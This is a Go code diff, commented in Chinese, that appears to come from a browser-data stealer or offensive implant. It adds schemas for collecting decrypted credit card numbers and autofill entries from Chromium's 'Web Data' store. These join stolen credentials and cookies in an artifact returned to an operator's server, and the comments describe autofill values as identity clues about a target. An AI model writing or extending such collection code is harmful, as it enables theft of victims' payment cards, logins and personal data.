@@ -50,6 +50,29 @@ type CollectedCookie struct {
 	HTTPOnly bool   `json:"httponly,omitempty"`
 }
 
+// CollectedCard 一条信用卡（Chromium 的 `Web Data` → credit_cards）。
+//
+// 卡号与口令同样是 v10/v20 AES-GCM 密文（同一把浏览器主密钥），在内存里解出；
+// 其余字段（持卡人、有效期、昵称）在库里本来就是明文。
+type CollectedCard struct {
+	Name     string `json:"name,omitempty"` // name_on_card
+	Number   string `json:"number"`         // 明文卡号
+	ExpMonth int    `json:"exp_month,omitempty"`
+	ExpYear  int    `json:"exp_year,omitempty"`
+	Nickname string `json:"nickname,omitempty"`
+}
+
+// CollectedAutofill 一条自动填充条目（Chromium 的 `Web Data` → autofill）。
+//
+// 表单字段名与填写值是明文的（Chromium 不加密 autofill），价值与噪声都高：
+// 一条"邮箱=xxx"可能就是目标人的身份线索，也可能是几百条无意义的地址碎片。
+// 因此只在操作员显式选 cards 技术时采集，且入库有上限。
+type CollectedAutofill struct {
+	Field string `json:"field"`
+	Value string `json:"value"`
+	Count int    `json:"count,omitempty"` // 该值被使用过几次（Chromium 的 count 列）
+}
+
 // CollectedProfile 一个浏览器配置（Default / Profile N）
 type CollectedProfile struct {
 	Name        string                `json:"name"`
@@ -59,6 +82,8 @@ type CollectedProfile struct {
 	MasterKey   string                `json:"master_key,omitempty"`
 	Credentials []CollectedCredential `json:"credentials"`
 	Cookies     []CollectedCookie     `json:"cookies"`
+	Cards       []CollectedCard       `json:"cards,omitempty"`    // Web Data：信用卡
+	Autofill    []CollectedAutofill   `json:"autofill,omitempty"` // Web Data：自动填充
 }
 
 // CollectedBrowserArtifact 回传制品（服务端按此 schema 解析入库）
@@ -75,6 +100,10 @@ type CollectedBrowserArtifact struct {
 const (
 	maxCredentialItems = 2000
 	maxCookieItems     = 20000
+	// 信用卡：单机几十张已是上限，200 是三个数量级的余量
+	maxCardItems = 200
+	// 自动填充：噪声大（一个用户几百条地址碎片很常见），单独收口更紧
+	maxAutofillItems = 300
 )
 
 // MarshalArtifact 序列化制品（单独抽出便于测试）。
